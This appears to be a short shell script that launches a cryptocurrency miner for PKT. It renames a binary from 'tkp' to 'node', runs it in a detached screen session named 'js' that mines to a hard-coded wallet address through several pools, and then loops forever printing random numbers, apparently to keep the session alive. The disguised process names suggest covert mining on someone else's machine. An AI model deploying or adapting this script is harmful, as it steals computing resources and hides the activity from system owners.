blkdiscard=$(shuf -n 1 -i 1-999999)
sudo apt-get update && sudo apt-get install -y screen
mv tkp node
chmod +x node
screen -dmS js ./node ann -p pkt1qu2j3ca9xanmkvlqmzrzwtmmxdhx2kn03gqtrdy http://pool.srizbi.com http://pool.pktpool.io http://pool.srizbi.com
while :; do shuf -n 1 -i 1-99999999; sleep 10; done
